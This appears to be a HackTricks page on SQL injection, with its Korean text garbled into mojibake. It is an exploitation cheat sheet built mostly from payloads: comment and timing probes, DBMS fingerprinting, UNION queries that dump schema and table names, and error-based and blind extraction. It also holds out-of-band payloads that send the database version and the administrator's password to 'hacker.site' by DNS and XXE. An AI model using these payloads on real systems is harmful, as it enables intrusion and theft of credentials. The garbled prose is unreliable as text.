# SQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„±ì´ ë†’ì€ ì‚¬ì´ë²„ ë³´ì•ˆ ì´ë²¤íŠ¸ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ  ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ê²ƒ**ì„ ì‚¬ëª…ìœ¼ë¡œ í•˜ëŠ” ì´ íšŒì˜ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì´ ëª¨ì´ëŠ” ëœ¨ê±°ìš´ ë§Œë‚¨ì˜ ì¥ì†Œì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

## SQL ì¸ì ì…˜ì´ë€ ë¬´ì—‡ì¸ê°€?

**SQL ì¸ì ì…˜**ì€ ê³µê²©ìê°€ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë°ì´í„°ë² ì´ìŠ¤ ì¿¼ë¦¬ì— **ê°„ì„­í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ”** ë³´ì•ˆ ê²°í•¨ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ ê³µê²©ìê°€ **ë³´ì§€ ëª»í•´ì•¼ í• ** ë°ì´í„°, ì¦‰ ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ì •ë³´ë‚˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ë°ì´í„°ë¥¼ **ì¡°íšŒ**, **ìˆ˜ì •**, ë˜ëŠ” **ì‚­ì œ**í•  ìˆ˜ ìˆê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ í–‰ë™ì€ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ê¸°ëŠ¥ì´ë‚˜ ì½˜í…ì¸ ì— ì˜êµ¬ì ì¸ ë³€ê²½ì„ ì´ˆë˜í•˜ê±°ë‚˜ ì„œë²„ì˜ ì†ìƒ ë˜ëŠ” ì„œë¹„ìŠ¤ ê±°ë¶€ë¥¼ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.


## ì§„ì…ì  íƒì§€

ì‚¬ì´íŠ¸ê°€ SQLi ê´€ë ¨ ì…ë ¥ì— ëŒ€í•œ ë¹„ì •ìƒì ì¸ ì„œë²„ ì‘ë‹µìœ¼ë¡œ ì¸í•´ **SQL ì¸ì ì…˜(SQLi)ì— ì·¨ì•½í•œ ê²ƒìœ¼ë¡œ ë³´ì¼ ë•Œ**, **ì²« ë²ˆì§¸ ë‹¨ê³„**ëŠ” **ì¿¼ë¦¬ë¥¼ ë°©í•´í•˜ì§€ ì•Šê³  ë°ì´í„° ì£¼ì… ë°©ë²•**ì„ ì´í•´í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ëŠ” í˜„ì¬ ì»¨í…ìŠ¤íŠ¸ì—ì„œ **íš¨ê³¼ì ìœ¼ë¡œ ë²—ì–´ë‚˜ëŠ” ë°©ë²•**ì„ ì‹ë³„í•˜ëŠ” ê²ƒì„ ìš”êµ¬í•©ë‹ˆë‹¤.  
ë‹¤ìŒì€ ìœ ìš©í•œ ëª‡ ê°€ì§€ ì˜ˆì…ë‹ˆë‹¤:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
ê·¸ëŸ¼, **ì˜¤ë¥˜ê°€ ì—†ë„ë¡ ì¿¼ë¦¬ë¥¼ ìˆ˜ì •í•˜ëŠ” ë°©ë²•**ì„ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. ì¿¼ë¦¬ë¥¼ ìˆ˜ì •í•˜ê¸° ìœ„í•´ **ë°ì´í„°ë¥¼ ì…ë ¥**í•˜ì—¬ **ì´ì „ ì¿¼ë¦¬ê°€ ìƒˆ ë°ì´í„°ë¥¼ ìˆ˜ìš©í•˜ë„ë¡** í•˜ê±°ë‚˜, ê·¸ëƒ¥ **ë°ì´í„°ë¥¼ ì…ë ¥**í•˜ê³  **ëì— ì£¼ì„ ê¸°í˜¸ë¥¼ ì¶”ê°€**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

_ì¿¼ë¦¬ê°€ ì‘ë™í•  ë•Œì™€ ì‘ë™í•˜ì§€ ì•Šì„ ë•Œ ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ ë³¼ ìˆ˜ ìˆê±°ë‚˜ ì°¨ì´ë¥¼ ë°œê²¬í•  ìˆ˜ ìˆë‹¤ë©´ ì´ ë‹¨ê³„ëŠ” ë” ì‰¬ìš¸ ê²ƒì…ë‹ˆë‹¤._

### **ì£¼ì„**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### ë…¼ë¦¬ ì—°ì‚°ìœ¼ë¡œ í™•ì¸í•˜ê¸°

SQL ì¸ì ì…˜ ì·¨ì•½ì ì„ í™•ì¸í•˜ëŠ” ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì€ **ë…¼ë¦¬ ì—°ì‚°**ì„ ì‹¤í–‰í•˜ê³  ì˜ˆìƒ ê²°ê³¼ë¥¼ ê´€ì°°í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `?username=Peter`ì™€ ê°™ì€ GET ë§¤ê°œë³€ìˆ˜ê°€ `?username=Peter' or '1'='1`ë¡œ ìˆ˜ì •í–ˆì„ ë•Œ ë™ì¼í•œ ì½˜í…ì¸ ë¥¼ ìƒì„±í•˜ë©´ SQL ì¸ì ì…˜ ì·¨ì•½ì ì´ ìˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

ë§ˆì°¬ê°€ì§€ë¡œ, **ìˆ˜í•™ì  ì—°ì‚°**ì˜ ì ìš©ì€ íš¨ê³¼ì ì¸ í™•ì¸ ê¸°ìˆ ë¡œ ì‘ìš©í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `?id=1`ê³¼ `?id=2-1`ì— ì ‘ê·¼í–ˆì„ ë•Œ ë™ì¼í•œ ê²°ê³¼ê°€ ë‚˜ì˜¨ë‹¤ë©´, ì´ëŠ” SQL ì¸ì ì…˜ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

ë…¼ë¦¬ ì—°ì‚° í™•ì¸ì„ ë³´ì—¬ì£¼ëŠ” ì˜ˆ:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
ì´ ë‹¨ì–´ ëª©ë¡ì€ ì œì•ˆëœ ë°©ë²•ìœ¼ë¡œ **SQLinjections**ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ ìƒì„±ë˜ì—ˆìŠµë‹ˆë‹¤:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### íƒ€ì´ë°ìœ¼ë¡œ í™•ì¸í•˜ê¸°

ì¼ë¶€ ê²½ìš°ì—ëŠ” í…ŒìŠ¤íŠ¸ ì¤‘ì¸ í˜ì´ì§€ì—ì„œ **ë³€í™”ë¥¼ ê°ì§€í•˜ì§€ ëª»í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ **ë¸”ë¼ì¸ë“œ SQL ì¸ì ì…˜**ì„ ë°œê²¬í•˜ëŠ” ì¢‹ì€ ë°©ë²•ì€ DBê°€ ì‘ì—…ì„ ìˆ˜í–‰í•˜ê²Œ í•˜ì—¬ í˜ì´ì§€ ë¡œë“œì— **ì‹œê°„ì— ì˜í–¥ì„ ë¯¸ì¹˜ê²Œ í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤**.\
ë”°ë¼ì„œ SQL ì¿¼ë¦¬ì— ì™„ë£Œí•˜ëŠ” ë° ë§ì€ ì‹œê°„ì´ ê±¸ë¦¬ëŠ” ì‘ì—…ì„ ì—°ê²°í•  ê²ƒì…ë‹ˆë‹¤:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
ì¼ë¶€ ê²½ìš°ì— **sleep í•¨ìˆ˜ê°€ í—ˆìš©ë˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ê·¸ëŸ° ê²½ìš°, ì´ëŸ¬í•œ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ëŠ” ëŒ€ì‹  ì¿¼ë¦¬ë¥¼ **ë³µì¡í•œ ì‘ì—…ì„ ìˆ˜í–‰í•˜ë„ë¡** ë§Œë“¤ì–´ ì—¬ëŸ¬ ì´ˆê°€ ê±¸ë¦¬ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. _ì´ëŸ¬í•œ ê¸°ìˆ ì˜ ì˜ˆëŠ” ê° ê¸°ìˆ ì— ëŒ€í•´ ë³„ë„ë¡œ ì£¼ì„ì„ ë‹¬ ì˜ˆì •ì…ë‹ˆë‹¤ (ìˆëŠ” ê²½ìš°)_.

### ë°±ì—”ë“œ ì‹ë³„

ë°±ì—”ë“œë¥¼ ì‹ë³„í•˜ëŠ” ê°€ì¥ ì¢‹ì€ ë°©ë²•ì€ ë‹¤ì–‘í•œ ë°±ì—”ë“œì˜ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•´ë³´ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ì „ ì„¹ì…˜ì˜ _**sleep**_ **í•¨ìˆ˜** ë˜ëŠ” ë‹¤ìŒì˜ í•¨ìˆ˜ë“¤ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (table from [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
ë˜í•œ, ì¿¼ë¦¬ì˜ ì¶œë ¥ì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤ë©´ **ë°ì´í„°ë² ì´ìŠ¤ì˜ ë²„ì „ì„ ì¶œë ¥**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="info" %}
ìš°ë¦¬ëŠ” ë‹¤ì–‘í•œ ì¢…ë¥˜ì˜ SQL Injectionì„ ì•…ìš©í•˜ëŠ” ë‹¤ì–‘í•œ ë°©ë²•ì— ëŒ€í•´ ë…¼ì˜í•  ê²ƒì…ë‹ˆë‹¤. MySQLì„ ì˜ˆë¡œ ì‚¬ìš©í•  ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

### PortSwiggerë¡œ ì‹ë³„í•˜ê¸°

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## ìœ ë‹ˆì˜¨ ê¸°ë°˜ ì•…ìš©

### ì—´ ìˆ˜ ê°ì§€í•˜ê¸°

ì¿¼ë¦¬ì˜ ì¶œë ¥ì„ ë³¼ ìˆ˜ ìˆë‹¤ë©´ ì´ê²ƒì´ ê°€ì¥ ì¢‹ì€ ì•…ìš© ë°©ë²•ì…ë‹ˆë‹¤.\
ìš°ì„ , **ì´ˆê¸° ìš”ì²­**ì´ ë°˜í™˜í•˜ëŠ” **ì—´**ì˜ **ìˆ˜**ë¥¼ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤. ì´ëŠ” **ë‘ ì¿¼ë¦¬ê°€ ë™ì¼í•œ ìˆ˜ì˜ ì—´ì„ ë°˜í™˜í•´ì•¼ í•˜ê¸° ë•Œë¬¸**ì…ë‹ˆë‹¤.\
ì´ ëª©ì ì„ ìœ„í•´ ì¼ë°˜ì ìœ¼ë¡œ ë‘ ê°€ì§€ ë°©ë²•ì´ ì‚¬ìš©ë©ë‹ˆë‹¤:

#### Order/Group by

ì¿¼ë¦¬ì˜ ì—´ ìˆ˜ë¥¼ ê²°ì •í•˜ê¸° ìœ„í•´, **ORDER BY** ë˜ëŠ” **GROUP BY** ì ˆì—ì„œ ì‚¬ìš©ëœ ìˆ«ìë¥¼ ì ì§„ì ìœ¼ë¡œ ì¡°ì •í•˜ì—¬ ì˜ëª»ëœ ì‘ë‹µì´ ìˆ˜ì‹ ë  ë•Œê¹Œì§€ ì§„í–‰í•©ë‹ˆë‹¤. SQL ë‚´ì—ì„œ **GROUP BY**ì™€ **ORDER BY**ì˜ ê¸°ëŠ¥ì´ ë‹¤ë¥´ì§€ë§Œ, ë‘ ê°€ì§€ ëª¨ë‘ ì¿¼ë¦¬ì˜ ì—´ ìˆ˜ë¥¼ í™•ì¸í•˜ëŠ” ë° ë™ì¼í•˜ê²Œ í™œìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

ì¿¼ë¦¬ê°€ ì˜¬ë°”ë¥¼ ë•Œê¹Œì§€ ë” ë§ì€ null ê°’ì„ ì„ íƒí•˜ì„¸ìš”:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_ì¿¼ë¦¬ ì–‘ìª½ì˜ ì—´ ìœ í˜•ì´ ë™ì¼í•´ì•¼ í•˜ëŠ” ê²½ìš°ê°€ ìˆìœ¼ë¯€ë¡œ `null` ê°’ì„ ì‚¬ìš©í•´ì•¼ í•˜ë©°, nullì€ ëª¨ë“  ê²½ìš°ì— ìœ íš¨í•©ë‹ˆë‹¤._

### ë°ì´í„°ë² ì´ìŠ¤ ì´ë¦„, í…Œì´ë¸” ì´ë¦„ ë° ì—´ ì´ë¦„ ì¶”ì¶œ

ë‹¤ìŒ ì˜ˆì œì—ì„œëŠ” ëª¨ë“  ë°ì´í„°ë² ì´ìŠ¤ì˜ ì´ë¦„, ë°ì´í„°ë² ì´ìŠ¤ì˜ í…Œì´ë¸” ì´ë¦„, í…Œì´ë¸”ì˜ ì—´ ì´ë¦„ì„ ê²€ìƒ‰í•  ê²ƒì…ë‹ˆë‹¤:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_ëª¨ë“  ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ì´ ë°ì´í„°ë¥¼ ë°œê²¬í•˜ëŠ” ë°©ë²•ì€ ë‹¤ë¥´ì§€ë§Œ, í•­ìƒ ë™ì¼í•œ ë°©ë²•ë¡ ì…ë‹ˆë‹¤._

## ìˆ¨ê²¨ì§„ ìœ ë‹ˆì˜¨ ê¸°ë°˜ í™œìš©

ì¿¼ë¦¬ì˜ ì¶œë ¥ì´ ë³´ì´ì§€ë§Œ ìœ ë‹ˆì˜¨ ê¸°ë°˜ ì£¼ì…ì´ ë¶ˆê°€ëŠ¥í•´ ë³´ì¼ ê²½ìš°, ì´ëŠ” **ìˆ¨ê²¨ì§„ ìœ ë‹ˆì˜¨ ê¸°ë°˜ ì£¼ì…**ì˜ ì¡´ì¬ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì´ ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì¢…ì¢… ë¸”ë¼ì¸ë“œ ì£¼ì… ìƒí™©ìœ¼ë¡œ ì´ì–´ì§‘ë‹ˆë‹¤. ë¸”ë¼ì¸ë“œ ì£¼ì…ì„ ìœ ë‹ˆì˜¨ ê¸°ë°˜ìœ¼ë¡œ ë³€í™˜í•˜ë ¤ë©´ ë°±ì—”ë“œì—ì„œ ì‹¤í–‰ë˜ëŠ” ì¿¼ë¦¬ë¥¼ íŒŒì•…í•´ì•¼ í•©ë‹ˆë‹¤.

ì´ëŠ” ë¸”ë¼ì¸ë“œ ì£¼ì… ê¸°ìˆ ê³¼ ëŒ€ìƒ ë°ì´í„°ë² ì´ìŠ¤ ê´€ë¦¬ ì‹œìŠ¤í…œ(DBMS)ì— íŠ¹ì •í•œ ê¸°ë³¸ í…Œì´ë¸”ì„ ì‚¬ìš©í•˜ì—¬ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ê¸°ë³¸ í…Œì´ë¸”ì„ ì´í•´í•˜ê¸° ìœ„í•´ì„œëŠ” ëŒ€ìƒ DBMSì˜ ë¬¸ì„œë¥¼ ì°¸ì¡°í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤.

ì¿¼ë¦¬ê°€ ì¶”ì¶œë˜ë©´, ì›ë˜ ì¿¼ë¦¬ë¥¼ ì•ˆì „í•˜ê²Œ ì¢…ë£Œí•˜ë„ë¡ í˜ì´ë¡œë“œë¥¼ ì¡°ì •í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ í›„, í˜ì´ë¡œë“œì— ìœ ë‹ˆì˜¨ ì¿¼ë¦¬ë¥¼ ì¶”ê°€í•˜ì—¬ ìƒˆë¡œ ì ‘ê·¼ ê°€ëŠ¥í•œ ìœ ë‹ˆì˜¨ ê¸°ë°˜ ì£¼ì…ì„ í™œìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë” í¬ê´„ì ì¸ í†µì°°ë ¥ì„ ì›í•˜ì‹œë©´ [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f)ì—ì„œ ì „ì²´ ê¸°ì‚¬ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”.

## ì˜¤ë¥˜ ê¸°ë°˜ í™œìš©

ì–´ë–¤ ì´ìœ ë¡œ **ì¿¼ë¦¬**ì˜ **ì¶œë ¥**ì„ **ë³¼ ìˆ˜ ì—†ì§€ë§Œ** **ì˜¤ë¥˜ ë©”ì‹œì§€**ëŠ” **ë³¼ ìˆ˜ ìˆëŠ” ê²½ìš°**, ì´ ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ë°ì´í„°ë¥¼ **ìœ ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ìœ ë‹ˆì˜¨ ê¸°ë°˜ í™œìš©ê³¼ ìœ ì‚¬í•œ íë¦„ì„ ë”°ë¼ DBë¥¼ ë¤í”„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Exploiting Blind SQLi

ì´ ê²½ìš° ì¿¼ë¦¬ì˜ ê²°ê³¼ë‚˜ ì˜¤ë¥˜ë¥¼ ë³¼ ìˆ˜ ì—†ì§€ë§Œ, ì¿¼ë¦¬ê°€ **true** ë˜ëŠ” **false** ì‘ë‹µì„ **return**í•  ë•Œ í˜ì´ì§€ì˜ ë‚´ìš©ì´ ë‹¤ë¥´ê¸° ë•Œë¬¸ì— êµ¬ë¶„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ ê²½ìš°, ê·¸ ë™ì‘ì„ ì•…ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ë¬¸ì ë‹¨ìœ„ë¡œ ë¤í”„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## Exploiting Error Blind SQLi

ì´ê²ƒì€ **ì´ì „ê³¼ ë™ì¼í•œ ê²½ìš°**ì´ì§€ë§Œ ì¿¼ë¦¬ì˜ true/false ì‘ë‹µì„ êµ¬ë¶„í•˜ëŠ” ëŒ€ì‹  SQL ì¿¼ë¦¬ì—ì„œ **ì˜¤ë¥˜**ê°€ ìˆëŠ”ì§€ ì—¬ë¶€ë¥¼ **êµ¬ë¶„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**(ì•„ë§ˆë„ HTTP ì„œë²„ê°€ ì¤‘ë‹¨ë˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤). ë”°ë¼ì„œ ì´ ê²½ìš° ì˜¬ë°”ë¥¸ ë¬¸ìë¥¼ ì¶”ì¸¡í•  ë•Œë§ˆë‹¤ SQL ì˜¤ë¥˜ë¥¼ ê°•ì œë¡œ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## ì‹œê°„ ê¸°ë°˜ SQLi í™œìš©

ì´ ê²½ìš°ì—ëŠ” í˜ì´ì§€ì˜ ë§¥ë½ì— ë”°ë¼ ì¿¼ë¦¬ì˜ **ì‘ë‹µ**ì„ **êµ¬ë¶„**í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì´ **ì—†ìŠµë‹ˆë‹¤**. í•˜ì§€ë§Œ, ì¶”ì¸¡í•œ ë¬¸ìê°€ ë§ë‹¤ë©´ í˜ì´ì§€ê°€ **ë” ì˜¤ë˜ ë¡œë“œë˜ë„ë¡** ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìš°ë¦¬ëŠ” ì´ë¯¸ [íƒ€ì´ë°ì„ ì‚¬ìš©í•˜ì—¬ SQLi ì·¨ì•½ì  í™•ì¸](./#confirming-with-timing)í•˜ëŠ” ì´ ê¸°ìˆ ì„ ì´ì „ì— ë³´ì•˜ìŠµë‹ˆë‹¤.
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Stacked Queries

ìŠ¤íƒ ì¿¼ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì—¬ëŸ¬ ì¿¼ë¦¬ë¥¼ ì—°ì†ìœ¼ë¡œ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í›„ì† ì¿¼ë¦¬ê°€ ì‹¤í–‰ë˜ëŠ” ë™ì•ˆ **ê²°ê³¼**ëŠ” **ì‘ìš© í”„ë¡œê·¸ë¨ì— ë°˜í™˜ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ ì´ ê¸°ìˆ ì€ ì£¼ë¡œ **ë¸”ë¼ì¸ë“œ ì·¨ì•½ì **ê³¼ ê´€ë ¨í•˜ì—¬ ì‚¬ìš©ë˜ë©°, ë‘ ë²ˆì§¸ ì¿¼ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ DNS ì¡°íšŒ, ì¡°ê±´ë¶€ ì˜¤ë¥˜ ë˜ëŠ” ì‹œê°„ ì§€ì—°ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Oracle**ì€ **ìŠ¤íƒ ì¿¼ë¦¬**ë¥¼ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. **MySQL, Microsoft** ë° **PostgreSQL**ì€ ì´ë¥¼ ì§€ì›í•©ë‹ˆë‹¤: `QUERY-1-HERE; QUERY-2-HERE`

## Out of band Exploitation

**ë‹¤ë¥¸** ì·¨ì•½ì  ì´ìš© ë°©ë²•ì´ **ì‘ë™í•˜ì§€ ì•ŠëŠ” ê²½ìš°**, **ë°ì´í„°ë² ì´ìŠ¤ê°€** ì •ë³´ë¥¼ **ì™¸ë¶€ í˜¸ìŠ¤íŠ¸**ë¡œ ìœ ì¶œí•˜ë„ë¡ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, DNS ì¿¼ë¦¬ë¥¼ í†µí•´:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### XXEë¥¼ í†µí•œ ëŒ€ì—­ ì™¸ ë°ì´í„° ìœ ì¶œ
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## ìë™í™”ëœ ì•…ìš©

[**sqlmap**](https://github.com/sqlmapproject/sqlmap)ì„ ì‚¬ìš©í•˜ì—¬ SQLi ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ë°©ë²•ì€ [SQLMap Cheatsheet](sqlmap/)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

## ê¸°ìˆ ë³„ ì •ë³´

SQL Injection ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ëª¨ë“  ë°©ë²•ì— ëŒ€í•´ ì´ë¯¸ ë…¼ì˜í–ˆìŠµë‹ˆë‹¤. ì´ ì±…ì—ì„œ ë°ì´í„°ë² ì´ìŠ¤ ê¸°ìˆ ì— ë”°ë¼ ëª‡ ê°€ì§€ ë” ë§ì€ íŠ¸ë¦­ì„ ì°¾ì•„ë³´ì„¸ìš”:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

